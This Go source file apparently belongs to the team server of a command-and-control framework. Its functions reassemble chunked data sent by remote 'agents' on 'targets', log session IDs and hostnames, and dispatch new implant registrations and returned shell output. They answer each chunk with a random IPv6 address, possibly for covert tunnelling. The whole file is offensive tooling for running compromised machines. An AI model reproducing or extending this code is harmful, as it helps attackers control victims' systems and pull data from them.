package core

import (
	"TeamServer/debug"
	"TeamServer/macro"
)

func (tm *TargetManager) ClearMessageContainer() {

	tm.Target.ActiveMessage = false
	tm.Target.MessageContainer.MessageType = "F"
	tm.Target.MessageContainer.Size = 0
	tm.Target.MessageContainer.Payload = ""

}

func (tm *TargetManager) retrieveRemainingData(expectedMessageType string) (string, bool) {

	if tm.Target.MessageContainer.MessageType == "F" {
		debug.Warn("No [%s] Waiting Message Available", expectedMessageType)
		return macro.MacroTaskNotFoundCode, false
	}

	TaskType := tm.Target.MessageContainer.MessageType
	if TaskType != expectedMessageType {
		debug.Warn("No [%s] Message Available", expectedMessageType)
		return macro.MacroTaskNotFoundCode, false
	}

	tm.Target.MessageContainer.Payload += tm.Data[8:]
	tm.logDataDownloadProgress()
	return randomIPv6(), true

}

//Shell Handler
func (tm *TargetManager) SaveAgentResult() string {
	debug.Good("All Data Downloaded Successfully From [%s | %s]", tm.Target.TargetData.SessionID, tm.Target.TargetData.HostName)
	debug.Info("Downloaded Message Type: %s", tm.Target.MessageContainer.MessageType)
	switch tm.Target.MessageContainer.MessageType {
	case macro.MacroRegisterCode:
		go tm.SaveNewRegistration()
	case macro.MacroShellResultCode:
		go tm.HandleShellResult()
	default:
		debug.Error("Agent Result Code Not Found")
	}
	return randomIPv6()
}
